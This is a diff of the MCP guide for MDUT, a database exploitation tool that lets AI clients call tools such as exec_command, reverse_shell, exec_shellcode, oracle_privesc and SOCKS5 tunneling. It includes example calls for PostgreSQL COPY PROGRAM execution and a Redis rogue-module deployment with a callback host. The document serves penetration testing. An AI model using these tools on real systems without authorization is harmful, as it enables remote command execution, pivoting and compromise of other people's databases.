@@ -1,455 +1,104 @@
-# MCP Usage Guide
+# MDUT MCP Guide
 
-MDUT supports exposing database exploitation capabilities via **MCP (Model Context Protocol)**. AI clients can connect via STDIO, HTTP SSE, or Streamable HTTP.
+MDUT MCP Server provides database connection, SQL, metadata, and exploitation operations to AI clients through the Model Context Protocol. It currently exposes **35 tools**, all backed by the session-level exploiter cache. Stateful settings such as the PostgreSQL execution method and Redis Module state remain available to subsequent calls.
 
-> This is the English version. For the Chinese version, see [mcp.md](./mcp.md).
+> Use deployment, command execution, file writes, SOCKS5, and Module features only in environments you are authorized to test.
 
-## Table of Contents
+## Startup
 
-- [Startup Methods](#startup-methods)
-- [Recommended: Configure with CC Switch](#recommended-configure-with-cc-switch)
-- [Configuration Examples](#configuration-examples)
-  - [STDIO Mode](#stdio-mode)
-  - [HTTP SSE Mode](#http-sse-mode)
-  - [Streamable HTTP Mode](#streamable-http-mode)
-- [MCP Capability List](#mcp-capability-list)
-- [Troubleshooting](#troubleshooting)
-- [Security Recommendations](#security-recommendations)
-
----
-
-## Startup Methods
-
-In the examples below, `{mdut}` represents the path to the MDUT executable. Replace it according to your actual installation:
-
-- Command-line install / self-built: `mdut`
-- Renamed binary: `Multiple_Database_Utilization_Tools`
-- macOS `.app` bundle binary: `/Applications/Multiple_Database_Utilization_Tools.app/Contents/MacOS/Multiple_Database_Utilization_Tools`
-- Linux executable: `/path/to/Multiple_Database_Utilization_Tools`
-
-**Recommended: create a symlink to `mdut` so you don't have to use long paths in configs.**
+STDIO mode (default):
 
 ```bash
-# macOS
-sudo ln -s /Applications/Multiple_Database_Utilization_Tools.app/Contents/MacOS/Multiple_Database_Utilization_Tools /usr/local/bin/mdut
-
-# Linux
-sudo ln -s /path/to/Multiple_Database_Utilization_Tools /usr/local/bin/mdut
+go build -tags mcp -o mdut-mcp ./cmd/mcp
+./mdut-mcp
 ```
 
-After that, you can use `mdut` directly in the terminal and MCP configuration. On Linux, extract the zip and make the binary executable first:
+HTTP SSE mode:
 
 ```bash
-unzip Multiple_Database_Utilization_Tools_linux_amd64.zip
-chmod +x Multiple_Database_Utilization_Tools
+./mdut-mcp --http --bind 127.0.0.1 --port 16699 --token YOUR_TOKEN
 ```
 
-### 1. STDIO Mode (Default)
+Clients should first call `connect` to obtain a `session_id`, then reuse that ID for subsequent tools.
 
-AI clients communicate with MDUT through standard input/output. Suitable for local tools like Claude Desktop, Cursor, and Claude Code.
+## Tool Inventory
 
-```bash
-{mdut} mcp
-```
+| Category | Tools |
+|---|---|
+| Connection management (5) | `list_connections`, `list_sessions`, `connect`, `disconnect`, `test_connection` |
+| SQL and metadata (6) | `sql_query`, `sql_execute`, `list_databases`, `list_tables`, `list_columns`, `get_ddl` |
+| Probing, deployment, and cleanup (5) | `check_exploit_env`, `deploy_exploit`, `cleanup_exploit`, `oracle_priv_report`, `oracle_privesc` |
+| Commands, files, and networking (16) | `exec_command`, `list_dir`, `read_file`, `write_file`, `delete_file`, `mk_dir`, `rename_file`, `append_file`, `read_file_chunk`, `file_size`, `hash_file`, `set_pg_exec_method`, `reverse_shell`, `exec_shellcode`, `start_socks5`, `stop_socks5` |
+| Redis-specific (3) | `redis_exec`, `redis_deploy_module`, `redis_write_precise` |
 
-With token authentication (recommended for shared machines or team environments):
+## File Operations
 
-```bash
-{mdut} mcp --token your-token-here
-```
+`base64_content` for `write_file` and `append_file` must use standard Base64. The handler passes it unchanged to the engine and returns the number of bytes written or appended. `read_file_chunk` returns a Base64 chunk. `offset` must be a nonnegative integer and may be zero; `length` must be a positive integer. Fractional, negative, zero-length, and overflowing values are rejected before the engine is called.
 
-### 2. HTTP SSE Mode
-
-MDUT exposes MCP endpoints as an HTTP service, and AI clients connect via Server-Sent Events (SSE).
-
-```bash
-{mdut} mcp --http --bind 127.0.0.1 --port 16699
-```
-
-For LAN access (be aware of security risks):
-
-```bash
-{mdut} mcp --http --bind 0.0.0.0 --port 16699 --token your-token-here
-```
-
-### 3. Streamable HTTP Mode
-
-MCP extended HTTP transport protocol. Uses standard HTTP request-response instead of long-lived SSE connections, resulting in lower resource usage.
-
-```bash
-{mdut} mcp --streamable --bind 127.0.0.1 --port 16699
-```
-
-With token authentication:
-
-```bash
-{mdut} mcp --streamable --bind 127.0.0.1 --port 16699 --token your-token-here
-```
-
-### GUI Mode
-
-Double-click to launch the MDUT desktop app → click the MCP icon in the left sidebar → configure transport mode, bind address, port, and token in the dialog → click "Start".
-
-> Note: CLI mode and GUI mode are mutually exclusive. After starting the MCP service in GUI mode, do not close the MDUT main window.
-
----
-
-## Recommended: Configure with CC Switch
-
-If you use multiple AI CLI tools such as Claude Code, Codex, and Gemini CLI, we recommend using **[CC Switch](https://ccswitch.io)** to manage MCP configurations centrally, instead of manually editing multiple JSON files.
-
-### Installation
-
-```bash
-# macOS
-brew install --cask cc-switch
-
-# For other platforms, see the official docs: https://cc-switch.cc/tutorials
-```
-
-### Configuration Steps
-
-1. Launch CC Switch and open the **MCP management panel**.
-2. Click Add MCP Server and choose `stdio` or `sse` mode.
-3. Enter the MDUT configuration:
-   - **stdio**: `command` = `{mdut}`, `args` = `["mcp"]` (append `--token` and the token value if needed)
-   - **sse**: `url` = `http://127.0.0.1:16699/sse`, add `Authorization: Bearer your-token-here` if token authentication is enabled
-4. Select the AI tools to sync (Claude Code / Codex / Gemini CLI, etc.).
-5. Click "Sync to Tools", and CC Switch will write the configuration to the corresponding client config files automatically.
-
-### Why Use CC Switch
-
-| Feature | Description |
-|---------|-------------|
-| Unified management | Configure once and sync to multiple AI CLI tools |
-| Bidirectional sync | Push from CC Switch or pull existing configs from tools |
-| One-click toggle | Enable or disable an MCP Server without editing files |
-| Config backup | Automatically keeps the last 10 configurations for rollback |
-
----
-
-## Configuration Examples
-
-### STDIO Mode
-
-STDIO configurations are structurally similar across clients. The core is `command` + `args`.
-
-#### Claude Desktop
-
-Configuration file location:
-
-- macOS: `~/Library/Application Support/Claude/claude_desktop_config.json`
-- Windows: `%APPDATA%\Claude\claude_desktop_config.json`
-- Linux: `~/.config/Claude/claude_desktop_config.json`
+`list_dir` accepts optional `path_charset`; `read_file` and `write_file` accept optional `path_charset` and `content_charset`. All default to `utf-8`, so existing calls require no changes.
 
 ```json
-{
-  "mcpServers": {
-    "mdut": {
-      "command": "{mdut}",
-      "args": ["mcp"]
-    }
-  }
-}
+{"session_id":"SESSION_ID","path":"/tmp/mdut-demo"}
 ```
 
-With token authentication:
+After creating the directory with `mk_dir`, write and append a file:
 
 ```json
-{
-  "mcpServers": {
-    "mdut": {
-      "command": "{mdut}",
-      "args": ["mcp", "--token", "your-token-here"]
-    }
-  }
-}
+{"session_id":"SESSION_ID","path":"/tmp/mdut-demo/a.bin","base64_content":"YWJj"}
 ```
 
-macOS App example:
+`append_file` uses the same argument shape. Read 4 bytes starting at the second byte:
 
 ```json
-{
-  "mcpServers": {
-    "mdut": {
-      "command": "/Applications/Multiple_Database_Utilization_Tools.app/Contents/MacOS/Multiple_Database_Utilization_Tools",
-      "args": ["mcp"]
-    }
-  }
-}
+{"session_id":"SESSION_ID","path":"/tmp/mdut-demo/a.bin","offset":1,"length":4}
 ```
 
-#### Cursor
-
-Create `.cursor/mcp.json` in the project root:
+Rename, size, and hash:
 
 ```json
-{
-  "mcpServers": {
-    "mdut": {
-      "command": "{mdut}",
-      "args": ["mcp"]
-    }
-  }
-}
+{"session_id":"SESSION_ID","old_path":"/tmp/mdut-demo/a.bin","new_path":"/tmp/mdut-demo/b.bin"}
 ```
-
-#### Continue
-
-Edit `~/.continue/config.json`:
 
 ```json
-{
-  "experimental": {
-    "mcpServers": {
-      "mdut": {
-        "command": "{mdut}",
-        "args": ["mcp"]
-      }
-    }
-  }
-}
+{"session_id":"SESSION_ID","path":"/tmp/mdut-demo/b.bin"}
 ```
 
-#### Cline
+The last request can be sent to `file_size` or `hash_file`, returning the byte size or SHA256 respectively.
 
-Cline configures MCP through VS Code settings. Add to project `.vscode/mcp.json` or global `settings.json`:
+## PostgreSQL Execution Methods
+
+`set_pg_exec_method` accepts only `udf`, `copy_program`, or `libc`, and only for PostgreSQL sessions. The method is stored on the session exploiter; call `exec_command` directly after setting it.
 
 ```json
-{
-  "mcpServers": {
-    "mdut": {
-      "command": "{mdut}",
-      "args": ["mcp"]
-    }
-  }
-}
+{"session_id":"SESSION_ID","method":"copy_program"}
 ```
 
-#### Windsurf
+`copy_program` uses `COPY ... PROGRAM` and does not deploy a UDF. The corresponding engine retains the existing `libc` cleanup behavior. Other database session types return a type error.
 
-Edit `~/.windsurf/mcp-config.json`:
+## SOCKS5 Authentication
+
+`start_socks5` adds optional `user` and `pass` arguments. Leaving both empty retains the original unauthenticated behavior.
 
 ```json
-{
-  "mcpServers": {
-    "mdut": {
-      "command": "{mdut}",
-      "args": ["mcp"]
-    }
-  }
-}
+{"session_id":"SESSION_ID","bind_addr":"0.0.0.0","port":11080,"user":"proxy-user","pass":"proxy-pass"}
 ```
 
-#### Claude Code
+`stop_socks5` requires only `session_id`.
 
-Claude Code supports MCP via project-level `claude.md` or global configuration. In the same directory as `.claude/CLAUDE.md`, or use the `/mcp` command:
+## Redis Module Deployment
 
-```bash
-/mcp add mdut stdio {mdut} mcp
-```
+For Redis sessions, generic `deploy_exploit` forwards to the same Module deployment path as `redis_deploy_module` instead of calling the generic no-op deployment. Both tools support the same optional arguments:
 
-> Note: Claude Code's MCP support depends on the version. Some versions only support MCP Servers declared within the project.
-
----
-
-### HTTP SSE Mode
-
-In SSE mode, clients need `type: "sse"` and the URL configured.
-
-#### Claude Desktop
+- `module_path`: remote Module path, generated automatically when empty.
+- `rogue_host`, `bind_addr`: direct local callback configuration.
+- `relay_addr`, `relay_rogue_host`, `relay_rogue_port`: VPS relay configuration.
 
 ```json
-{
-  "mcpServers": {
-    "mdut": {
-      "type": "sse",
-      "url": "http://127.0.0.1:16699/sse"
-    }
-  }
-}
+{"session_id":"SESSION_ID","module_path":"/tmp/system.so","rogue_host":"192.0.2.10","bind_addr":"0.0.0.0:0"}
 ```
 
-With token authentication:
+The Redis-specific `redis_deploy_module` accepts the same request body. Cleanup continues to use `cleanup_exploit`.
 
-```json
-{
-  "mcpServers": {
-    "mdut": {
-      "type": "sse",
-      "url": "http://127.0.0.1:16699/sse",
-      "headers": {
-        "Authorization": "Bearer your-token-here"
-      }
-    }
-  }
-}
-```
+## Shellcode Behavior
 
-#### Cursor
-
-```json
-{
-  "mcpServers": {
-    "mdut": {
-      "type": "sse",
-      "url": "http://127.0.0.1:16699/sse"
-    }
-  }
-}
-```
-
-#### Continue
-
-```json
-{
-  "experimental": {
-    "mcpServers": {
-      "mdut": {
-        "transport": "sse",
-        "url": "http://127.0.0.1:16699/sse"
-      }
-    }
-  }
-}
-```
-
-### Streamable HTTP Mode
-
-Streamable HTTP is currently mainly supported by Claude Desktop and some newer MCP clients.
-
-#### Claude Desktop
-
-```json
-{
-  "mcpServers": {
-    "mdut": {
-      "type": "streamable-http",
-      "url": "http://127.0.0.1:16699/mcp"
-    }
-  }
-}
-```
-
-With token authentication:
-
-```json
-{
-  "mcpServers": {
-    "mdut": {
-      "type": "streamable-http",
-      "url": "http://127.0.0.1:16699/mcp",
-      "headers": {
-        "Authorization": "Bearer your-token-here"
-      }
-    }
-  }
-}
-```
-
----
-
-## Endpoint Reference
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/sse` | GET | SSE event stream endpoint for receiving server messages |
-| `/messages` | POST | Endpoint for client-to-server requests |
-| `/mcp` | POST/GET | Streamable HTTP endpoint |
-
----
-
-## MCP Capability List
-
-MDUT exposes the following capabilities through MCP (the actual list is returned by `tools/list` at runtime):
-
-- Database connection and probing
-- SQL execution and result reading
-- File system read/write (e.g., UDF / privilege escalation scripts)
-- System command execution (supported database types)
-- Internal network proxy and tunneling operations
-
-After a successful connection, the AI client will usually pull the available tool list automatically. You can then ask the AI to use MDUT to perform database operations.
-
----
-
-## Troubleshooting
-
-### 1. Command not found / client fails to start
-
-- Make sure `{mdut}` is replaced with the actual executable path
-- Make sure the binary is executable: `chmod +x {mdut}`
-- Make sure the `mdut` directory is in your system `PATH`, or use an absolute path in the configuration
-- macOS `.app` bundles may be blocked by Gatekeeper. Run:
-
-```bash
-xattr -dr com.apple.quarantine /Applications/Multiple_Database_Utilization_Tools.app
-```
-
-### 2. SSE mode client cannot connect
-
-- Make sure the MDUT service is running: `curl http://127.0.0.1:16699/sse` should receive an SSE stream
-- Make sure the client URL matches the startup parameters (port and IP)
-- Make sure the firewall is not blocking the port
-- If using `0.0.0.0`, make sure the client machine can reach the server machine
-
-### 3. Token authentication fails
-
-- In STDIO mode, pass the token via the `--token` argument
-- In SSE / Streamable HTTP mode, pass the token via the `Authorization: Bearer your-token-here` header
-- Make sure the token in the startup command exactly matches the one in the client configuration
-
-### 4. Port already in use
-
-```bash
-# macOS / Linux
-lsof -i :16699
-
-# Windows
-netstat -ano | findstr :16699
-```
-
-Change the port and update the client configuration accordingly:
-
-```bash
-{mdut} mcp --http --bind 127.0.0.1 --port 16698
-```
-
-### 5. How to view MDUT MCP logs
-
-In STDIO mode, MDUT logs are usually written to stderr. You can redirect them in the configuration:
-
-```json
-{
-  "mcpServers": {
-    "mdut": {
-      "command": "{mdut}",
-      "args": ["mcp"],
-      "env": {
-        "MCP_LOG_LEVEL": "debug"
-      }
-    }
-  }
-}
-```
-
-In SSE mode, start the service in the foreground and watch the console output.
-
----
-
-## Security Recommendations
-
-- **Local use**: Prefer STDIO mode. It requires no network port and has the lowest risk.
-- **LAN access**: SSE / Streamable HTTP mode must use `--token`, and preferably bind to `127.0.0.1`.
-- **Public internet access**: Strongly discouraged. If absolutely necessary, use a reverse proxy with TLS, IP allowlisting, and a strong token.
-- **Token management**: Avoid weak passwords or long-lived hardcoded tokens in configuration files. Rotate tokens regularly in team environments.
-- **Least privilege**: The OS user running MDUT should only have the necessary file and database permissions. Avoid running as root / Administrator continuously.
-
----
-
-## Notes
-
-- The default bind address `127.0.0.1` only allows local access; use `0.0.0.0` for LAN access.
-- Token authentication is **required** when exposing to LAN / public network.
-- Make sure the firewall allows the configured port.
-- CLI mode and GUI mode are mutually exclusive. After starting MCP in GUI mode, do not close the MDUT main window.
+`exec_shellcode` accepts a hexadecimal string. MSSQL/Redis inject shellcode into a subprocess; MySQL/PostgreSQL execute it inside the database process, which can affect database process stability.
